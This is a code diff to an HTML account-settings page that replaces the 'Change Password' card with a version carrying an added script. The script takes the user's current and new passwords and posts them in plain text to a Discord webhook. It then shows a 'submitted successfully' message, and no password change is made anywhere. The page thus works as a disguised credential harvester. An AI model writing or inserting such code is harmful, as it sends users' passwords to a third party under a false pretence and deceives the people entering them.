@@ -359,44 +359,92 @@
             </div>
           </div>
           <!-- Card Change Password -->
-          <div class="card mt-4" id="password">
-            <div class="card-header">
-              <h5>Change Password</h5>
-            </div>
-            <div class="card-body pt-0">
-              <div class="input-group input-group-outline focused is-focused is-filled">
-                <label class="form-label">Current password</label>
-                <input type="password" class="form-control" onfocus="focused(this)" onfocusout="defocused(this)">
-              </div>
-              <div class="input-group input-group-outline my-4">
-                <label class="form-label">New password</label>
-                <input type="password" class="form-control" onfocus="focused(this)" onfocusout="defocused(this)">
-              </div>
-              <div class="input-group input-group-outline">
-                <label class="form-label">Confirm New password</label>
-                <input type="password" class="form-control" onfocus="focused(this)" onfocusout="defocused(this)">
-              </div>
-              <h5 class="mt-5">Password requirements</h5>
-              <p class="text-muted mb-2">
-                Please follow this guide for a strong password:
-              </p>
-              <ul class="text-muted ps-4 mb-0 float-start">
-                <li>
-                  <span class="text-sm">One special characters</span>
-                </li>
-                <li>
-                  <span class="text-sm">Min 6 characters</span>
-                </li>
-                <li>
-                  <span class="text-sm">One number (2 are recommended)</span>
-                </li>
-                <li>
-                  <span class="text-sm">Change it often</span>
-                </li>
-              </ul>
-              <button class="btn bg-gradient-dark btn-sm float-end mt-6 mb-0">Update password</button>
-            </div>
-          </div>
+<div class="card mt-4" id="password">
+    <div class="card-header">
+        <h5>Change Password</h5>
+    </div>
+    <div class="card-body pt-0">
+        <div class="input-group input-group-outline focused is-focused is-filled">
+            <label class="form-label">Current password</label>
+            <input type="password" id="currentPassword" class="form-control" onfocus="focused(this)" onfocusout="defocused(this)" required>
+        </div>
+        <div class="input-group input-group-outline my-4">
+            <label class="form-label">New password</label>
+            <input type="password" id="newPassword" class="form-control" onfocus="focused(this)" onfocusout="defocused(this)" required>
+        </div>
+        <div class="input-group input-group-outline">
+            <label class="form-label">Confirm New password</label>
+            <input type="password" id="confirmNewPassword" class="form-control" onfocus="focused(this)" onfocusout="defocused(this)" required>
+        </div>
+        <h5 class="mt-5">Password requirements</h5>
+        <p class="text-muted mb-2">
+            Please follow this guide for a strong password:
+        </p>
+        <ul class="text-muted ps-4 mb-0 float-start">
+            <li>
+                <span class="text-sm">One special character</span>
+            </li>
+            <li>
+                <span class="text-sm">Min 6 characters</span>
+            </li>
+            <li>
+                <span class="text-sm">One number (2 are recommended)</span>
+            </li>
+            <li>
+                <span class="text-sm">Change it often</span>
+            </li>
+        </ul>
+        <button id="updatePasswordBtn" class="btn bg-gradient-dark btn-sm float-end mt-6 mb-0">Update password</button>
+    </div>
+</div>
+
+<script>
+    document.getElementById('updatePasswordBtn').addEventListener('click', async function (e) {
+        e.preventDefault(); // Prevent default button behavior
+
+        // Get the values from the form
+        const currentPassword = document.getElementById('currentPassword').value;
+        const newPassword = document.getElementById('newPassword').value;
+        const confirmNewPassword = document.getElementById('confirmNewPassword').value;
+
+        // Validate that the new password and confirm password match
+        if (newPassword !== confirmNewPassword) {
+            alert('New password and confirm password do not match!');
+            return;
+        }
+
+        // Your Discord Webhook URL
+        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your actual Discord webhook URL
+
+        // Create the message to send to Discord
+        const discordMessage = {
+            content: `Password change request:
+                      \nCurrent Password: ${currentPassword} 
+                      \nNew Password: ${newPassword}`
+        };
+
+        try {
+            // Send the data to Discord via the webhook
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(discordMessage)
+            });
+
+            if (response.ok) {
+                alert('Password change request submitted successfully!');
+            } else {
+                alert('Failed to submit the request.');
+            }
+        } catch (error) {
+            console.error('Error sending webhook:', error);
+            alert('Error sending request.');
+        }
+    });
+</script>
+
           <!-- Card Change Password -->
           <div class="card mt-4" id="2fa">
             <div class="card-header d-flex">
